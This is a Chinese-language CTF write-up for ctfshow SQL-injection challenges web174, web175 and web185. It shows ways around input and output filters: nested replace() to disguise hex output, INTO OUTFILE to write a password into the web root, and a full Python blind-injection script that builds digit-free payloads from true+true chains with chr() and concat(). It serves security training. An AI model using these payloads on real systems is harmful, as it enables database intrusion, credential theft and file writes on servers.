## 一句话概括

数字和引号会在两个地方被拦：你写进 payload 的数字与引号（输入侧），和回显里出现的数字与引号（输出侧）。输入侧被拦就用 `chr(true+true+...)` 这类表达式把数字算出来；输出侧被拦就把结果换成别的字符集（`replace`）或干脆写进文件、换一条信道带出（`into outfile`）。

## 被过滤的东西 → 绕过手法对照表

| 被过滤的东西 | 出现在哪 | 绕过手法 |
|---|---|---|
| 数字 `0-9` | 输入（payload 里） | `true+true+...+true` 用布尔运算凑数，再喂给 `chr()` |
| 单引号 `'` `"` | 输入 | 十六进制 `0x...`、`chr()+concat`、`char()` |
| 数字 `0-9` | 输出（回显里） | `replace()` 把数字换成字母，本地再映射回来 |
| 全部 ASCII `\x00-\x7f` | 输出 | `into outfile` 写文件，走 HTTP 直接读 |
| 关键字 `flag` | 输出 | 编码为 hex/base64（见 `输出编码绕过`） |

## 本题情景与解题手法：web174（输出过滤数字）

### 题目形态

注入点与 web172 相同，但页面在返回前多了一层检查，而且这次拉黑的是数字：

```php
// 拼接 SQL
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";

// 检查结果里是否有 flag 或数字，有就不给"查询成功"
if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
    $ret['msg']='查询成功';
}
```

回显里只要出现 `flag` 或任何一个数字，页面就不显示成功。可我们要取的 `password` 是十六进制串，天然全是数字。

### 第一步：把数字换成字母

思路是：先在 SQL 里把十六进制结果里的数字替换成字母，让回显里一个数字都没有；然后本地把字母映射回数字再解码。

```sql
' union select 'aa', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(
    hex(password),'0','A'),'1','B'),'2','C'),'3','D'),'4','E'),
    '5','F'),'6','G'),'7','H'),'8','I'),'9','J')
from ctfshow_user4 where username='flag' --+
```

层层 `replace` 的效果是：`0→A, 1→B, …, 9→J`。于是 `GGGCGBGHDBCD` 这样一串纯字母就出现在页面上，完美避开 `/flag|[0-9]/`。

注意 `-1' union select 1, ...` 里的 `1` 是数字，会被输出过滤命中，所以要换成 `'aa'` 这种不含数字的字符串占位。payload 里出现的数字只在输入侧，而输入侧这道题没过滤，两个方向的过滤要分开看。

### 第二步：本地还原

```python
# 页面上拿到的编码串
encoded_str = "GGGCGBGHDBCD"

# 字母转回数字
letter_to_num = {'A':'0','B':'1','C':'2','D':'3','E':'4',
                 'F':'5','G':'6','H':'7','I':'8','J':'9'}

hex_str = ""
for char in encoded_str:
    if char in letter_to_num:
        hex_str += letter_to_num[char]   # 字母换回数字
    else:
        hex_str += char                  # 其他字符保持原样

print("十六进制:", hex_str)

# 十六进制解码
flag = bytes.fromhex(hex_str).decode('utf-8')
print("最终flag:", flag)
```

### 注入手法一句话总结

回显里不能出现数字，就用 `replace()` 在数据库侧把数字重写成字母；页面拿到的是纯字母，本地再逆映射加 hex 解码还原数据。

## 本题情景与解题手法：web175（输出过滤全部 ASCII）

### 题目形态

WAF 直接拉黑了所有 ASCII 字符（`\x00`–`\x7f`，包括字母、数字、标点）：

```php
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";

if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
    $ret['msg']='查询成功';
}
```

- `[\x00-\x7f]` 匹配全部 ASCII 字符；
- `!preg_match` 取反后：只有回显里一个 ASCII 字符都没有（也就是只含中文、日文等非 ASCII 字符），才显示"查询成功"。

这意味着编码这条路彻底走不通：hex、base64 的结果全是 ASCII，一样会被拦。

### 第一步：换一条信道，into outfile

既然页面回显这条信道被堵死，就绕过页面，直接把数据写进服务器文件：

```sql
?id=1' union select 1,password from ctfshow_user5 where username='flag'
     into outfile '/var/www/html/1.txt'--+
```

### 第二步：直接访问生成的文件

```text
http://靶机地址/1.txt
```

浏览器里看到的就是 `password` 的明文。

### 为什么能绕过

- 页面的正则过滤只作用于页面回显；
- `INTO OUTFILE` 是让 MySQL 在目标服务器的文件系统上写文件，数据压根不经过页面的输出过滤；
- 文件落在 Web 根目录下，就成了一个可以直接用 HTTP 请求的静态资源。

```text
你的电脑 --HTTP 注入请求--> 目标服务器 --MySQL--> 目标服务器磁盘（写 1.txt）
                                                        |
你的电脑 <--HTTP 读 1.txt-- 目标服务器 <-----------------+
```

### 第三步：注意限制

1. 需要 FILE 权限：MySQL 用户得有权写文件；
2. 目录要可写：`/var/www/html/` 必须对 MySQL 用户可写；
3. 文件必须原先不存在：否则报错

   ```text
   ERROR 1086 (HY000): File '/var/www/html/1.txt' already exists
   ```

   所以要么换个不冲突的文件名，要么先删掉旧文件。

### 注入手法一句话总结

回显被全 ASCII 过滤时放弃编码路线（编码结果也是 ASCII），改用 `INTO OUTFILE` 把结果写到 Web 目录，通过 HTTP 直接读取。这里绕过的是信道，不是过滤规则。

## 本题情景与解题手法：web185（输入过滤数字和引号）

### 题目形态

这次被拦的是输入侧：WAF 过滤了数字和引号，导致 web184 里 `like 0x63746625`（十六进制）那招失效，因为十六进制里带数字 `0-9`，而单引号又被禁，没法写字符串。

```php
// WAF 同时拉黑了数字和引号
if (preg_match('/[0-9\'"]/', $_POST['tableName'])) { die('sql inject error'); }
```

### 第一步：既然写不了数字，就用布尔值算出数字

MySQL 里 `true` 的值是 `1`，`false` 是 `0`。于是：

- `true` → 1
- `true+true` → 2
- `true+true+true` → 3

脚本里的 `reNum(n)` 就是重复加 `true`，用纯字母拼出任意数字：

```python
def reNum(n):
    a = "true"
    for i in range(n-1):
        a += "+true"
    return a[0:]
```

### 第二步：用 `chr()` 把数字还原成字符，再用 `concat` 拼起来

```python
def reNum_to_Str(m):
    s = ""
    for i in m:
        s += ",chr(" + reNum(ord(i)) + ")"   # 每个字符 → chr(数字)
    return s[1:]                              # 去掉开头的逗号
```

最终发出去的 payload 形如：

```sql
tableName=ctfshow_user group by pass having pass like(concat(chr(true+true+...+true),chr(...),...))
```

- `chr(数值)` 把 ASCII 码还原成字符；
- `concat(...)` 把一个个字符拼成完整的匹配串（如 `ctfshow{a%`）；
- 整串里一个数字、一个引号都没有，全部由 `true`、`chr`、`concat` 组成。

注意：MySQL 内建的等价函数是 `CHAR()`；上面的脚本写的是 `chr()`，若环境报"函数不存在"就换成 `CHAR()`。

### 第三步：完整脚本

```python
import requests

def reNum(n):
    a = "true"
    for i in range(n - 1):
        a += "+true"
    return a[0:]

def reNum_to_Str(m):
    s = ""
    for i in m:
        s += ",chr(" + reNum(ord(i)) + ")"
    return s[1:]

url = "http://靶机地址/select-waf.php"

flagstr = "{abcdefghijklmnopqrstuvwxyz-0123456789}"
flag = "ctfshow{"
for i in range(0, 50):
    for x in flagstr:
        data = {
            "tableName": "ctfshow_user group by pass having pass like(concat({}))".format(
                reNum_to_Str(flag + x + "%"))
        }
        response = requests.post(url, data).text
        if "$user_count = 0;" not in response:   # 说明命中了分组，字符正确
            flag += x
            print(flag)
            break
    if x == "}":
        break

print("finish")
```

### 注入手法一句话总结

数字和引号都被禁时，用 `true+true+...+true` 把数字算出来，用 `chr()` 还原字符、`concat()` 拼串，整条 payload 只由字母和运算符组成。

## 注意事项

- 分清过滤的是输入还是输出：输入侧过滤（web185）要改 payload 的写法；输出侧过滤（web174/web175）要么改数据的呈现方式，要么把数据带出去。两者动作完全不同。
- `into outfile` 写文件不经过页面：它绕的是回显过滤这条信道，因此即使过滤规则再严也拦不住。
- `into outfile` 只能写新文件：重复执行会报 `File ... already exists`，换个名字即可。
- `replace` 的嵌套顺序不影响结果：每个 `replace` 处理的是不同的数字，互不干扰，所以嵌套十层也能正确还原。
- `group by pass having ...` 的返回值差异是判据：命中分组时页面 `$user_count` 不为 0，脚本据此判断字符对错，见 `过滤绕过-where与引号`。
- 题号对应关系：`ctfshow_user2` ↔ web172/173、`ctfshow_user4` ↔ web174、`ctfshow_user5` ↔ web175。
